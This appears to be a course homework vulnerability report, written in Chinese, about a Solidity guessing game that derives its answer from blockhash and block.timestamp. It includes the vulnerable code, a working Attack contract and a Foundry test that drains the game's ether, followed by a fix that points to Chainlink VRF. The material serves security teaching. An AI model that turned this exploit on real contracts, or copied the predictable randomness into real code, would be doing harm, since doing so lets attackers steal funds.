# block.number 與 block.timestamp 公開可見，攻擊者使用相同算法即可持續猜中獲勝

# Lines of code

https://github.com/z-institute/Web3-Security-Dev-Batch-1-HW/blob/Z24028008/w4/src/Game.sol#L8

# Vulnerability details

block.number 與 block.timestamp 在鏈上都是可見、可被監控的，因此不適合作為隨機數的參數，

```solidity
function guess(uint256 _guess, address _receiver ) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        if (_guess == answer) {
            (bool sent, ) = _receiver.call{value: address(this).balance}("");
            require(sent, "Failed to send Ether");
        }
    }
```

攻擊者可設置 Game 合約接口，並使用相同的參數與算法，再調用 guess 函數將值傳入，即可猜中獲勝。

# Impact

任何人在鏈上皆可見 block.number 與 block.timestamp 的值，只要設置 Game 合約接口，並使用相同的參數與算法即可算出 guess 函數的答案，調用 guess 函數將值傳入即可猜中獲勝。

# PoC

以下程式碼用以驗證漏洞。

撰寫 Attack 合約：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGame {
    function guess(uint256 _guess, address _receiver) external;
}

contract Attack {
    IGame public gameContract;

    constructor(address _gameContract) {
        gameContract = IGame(_gameContract);
    }

    function attack() public {
        uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        gameContract.guess(answer, msg.sender);
    }
}
```

調用 Attack 合約進行攻擊：

```solidity
function testExploit() public payable {
    /**
        * CODE YOUR EXPLOIT HERE
        */
    vm.prank(attacker);
    attack.attack();
    /**
        * SUCCESS CONDITIONS
        */
    assertEq(address(attacker).balance, 1 ether);
}
```

# Recommendation

Use ChainLink VRF
